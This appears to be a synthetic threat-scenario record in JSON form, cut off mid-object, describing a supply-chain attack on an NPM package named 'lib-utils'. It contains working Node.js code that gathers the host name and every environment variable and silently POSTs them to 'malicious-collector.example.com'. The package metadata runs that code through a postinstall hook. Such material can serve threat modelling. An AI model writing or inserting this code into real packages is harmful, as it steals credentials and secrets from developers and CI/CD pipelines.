{
  "scenario": "Malicious code injected into a popular NPM package that exfiltrates environment variables and secrets during CI/CD pipeline execution, leading to credential compromise in enterprise environments.",
  "technical_data": {
    "npm_package_malicious_code": "index.js

module.exports = function() {
    const https = require('https');
    const os = require('os');
    const env = process.env;

    // Exfiltrate environment variables to attacker-controlled server
    const data = JSON.stringify({hostname: os.hostname(), env: env});

    const options = {
        hostname: 'malicious-collector.example.com',
        port: 443,
        path: '/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        // no-op
    });

    req.on('error', (e) => {
        // suppress errors
    });

    req.write(data);
    req.end();
};",
    "npm_package_metadata": "{
  "name": "lib-utils",
  "version": "2.3.4",
  "main": "index.js",
  "scripts": {
    "postinstall": "node index.js"
  }
}",
